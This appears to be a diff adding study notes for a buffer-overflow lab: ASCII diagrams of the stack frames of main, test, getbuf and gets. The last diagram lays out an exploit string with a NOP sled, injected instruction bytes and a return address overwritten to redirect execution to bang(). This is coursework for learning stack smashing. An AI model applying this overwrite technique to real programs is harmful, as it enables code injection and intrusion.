@@ -1,0 +1,87 @@
+//GetBuf has been called but not run
+[smaller addresses]
++----------+ //getbuf() frame
+|RA        |
++----------+ //test() frame
+|RA        | //to main()
+|          |
+|          |
+|0x00000000| //val
+|%esp      | //start of test() frame
++----------+ //main() frame
+|RA        | //return to the end of the program
+|          |
+|          |
+|          |
+|          |
+|%esp      | //start of stack
++----------+
+[larger addresses]
+
+//Gets has been called but not run
+[smaller addresses]
++----------+ //gets() frame
+|RA        |
++----------+ //getbuf() frame
+|RA        | //to test()
+|%ebp      | 
+|          | //extra space
+|          | //extra space
+|0x00000000| //end allocation for buf
+|0x00000000|
+|0x00000000|
+|0x00000000|
+|0x00000000|
+|0x00000000|
+|0x00000000|
+|0x00000000| //start allocation for buf
+|%esp      | //start of getbuf() frame
++----------+ //test() frame
+|RA        | //to main()
+|%ebp      |
+|          |
+|0x00000000| //val
+|%esp      | //start of test() frame
++----------+ //main() frame
+|RA        | //return to the end of the program
+|          |
+|          |
+|          |
+|          |
+|%esp      | //start of stack
++----------+
+[larger addresses]
+
+//"How is this for a sample input string?"
+[smaller addresses]
++----------+ //bang() frame
+|RA        |
++----------+ //getbuf() frame
+|0x55683758| //to the exploit string
+|0xc308048c| //completely overwritten space
+|0xad6815e2| //completely overwritten space
+|0x1f460804| //end allocation for buf
+|0xd10005c7|
+|0x90909090|
+|0x90909090|
+|0x90909090|
+|0x90909090|
+|0x90909090|
+|0x90909090| //start allocation for buf
+|%esp      | //start of getbuf() frame
++----------+ //test() frame
+|RA        | //to main()
+|          |
+|          |
+|0x00000000| //val
+|%esp      | //start of test() frame
++----------+ //main() frame
+|RA        | //return to the end of the program
+|          |
+|          |
+|          |
+|          |
+|%esp      | //start of stack
++----------+
+[larger addresses]
+
